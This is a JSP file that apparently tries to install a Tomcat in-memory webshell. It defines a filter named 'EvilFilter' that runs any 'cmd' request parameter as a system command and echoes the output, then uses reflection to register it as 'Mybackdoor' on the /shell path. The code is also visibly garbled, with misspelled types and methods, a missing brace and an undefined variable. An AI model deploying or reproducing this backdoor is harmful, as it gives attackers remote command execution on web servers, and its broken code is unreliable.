<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>

<%
    public class EvilFilterimplements Filter{
        @Override
        publib void init(FilterConfig filterConfig) throws ServletException{

        }
        @Override
        public void doFilter(ServeletRequest request,ServletResponse response,FilterChain chain) throws Exception{
            HTTPServletRequest request=(HTTPServletRequest)request;
            HTTPServletResponse response=(HTTPServletResponse)response;
            
            String cmd = request.getPrameter("cmd");
            
            if(cmd!=null&&!cmd.isEmpty())
            {
                response.setContentType("text/html;charset=UTF-8");
                PrintWriter out=response.getWriter();
                try{
                    Process p=Runtime.getRuntime().exec(cmd);
                    BufferedReader reader=new BufferedReader(new InputStreamReader(p.getInputStream()));
                    while((String line = reader.readLine()) != null){
                        out.println(line);
                    }
                }catch(Exception e){
                    out.println(e.toString());
                }
                out.flush();
                return;
                
            }
            chain.doFilter(request,response);
        }
        @Override 
        public void destroy(){

        }
    }

    StandardContext sct=null;
    ClassLoader cl=Thread.currentThread().getContextCladdLoader();
    Class<?> clazz=cl.getClass();
    Object resources=null;
    while(clazz!=null &&resources==null){
        try{
            Field resourcesField=cl.getClass().getDeclaredField("resources");
            resourcesField.setAccessible(true);
            resources=resourcesField.get(cl);
        }catch(NoSuchFieldException e){
            clazz = clazz.getSuperclass();
            }
        }
        if (resources == null) {
        throw new Exception("找不到 resources 字段");
    }
    
    Field ContextField=null;
    Class<?> resourcesClazz=resources.getClass();
    while(resourcesClazz!=null && ContextField==null){
        try{
            ContextField=resourcesClazz.getDeclaredField("context");
            ContextField.setAccessible(true);
        }catch(NoSuchFieldException e){
            resourcesClazz = resourcesClazz.getSuperclass();
        }
    }
     if (ContextField == null) {
        throw new Exception("找不到 context 字段");
    sct=(StandardContext)ContextField.get(resources);

    EvilFilter evFilter=new EvilFilter();

    FilterDef fd=new FilterDef();
    Class<EvilFilter> filterClass = EvilFilter.class;
    fd.setFilterName("Mybackdoor");
    fd.setFilter(evFilter);
    fd.setFilterclass(filterClass.getName());
    sct.addFilterDef(fd);

    FilterMap fm=new FilterMap();
    fm.setFilterName("Mybackdoor");
    fm.addURLPattern("/shell");
    fm.setDispatcher("REQUEST");
    sct.addFilterMap(fm);

    Constructor<ApplicationFilterConfig> constructor = ApplicationFilterConfig.class.getConstructor(StandardContext.class, FilterDef.class);
    ApplicationFilterConfig filterConfig = constructor.newInstance(sct, fd);
    filterConfigs.put("Mybackdoor", filterConfig);


%>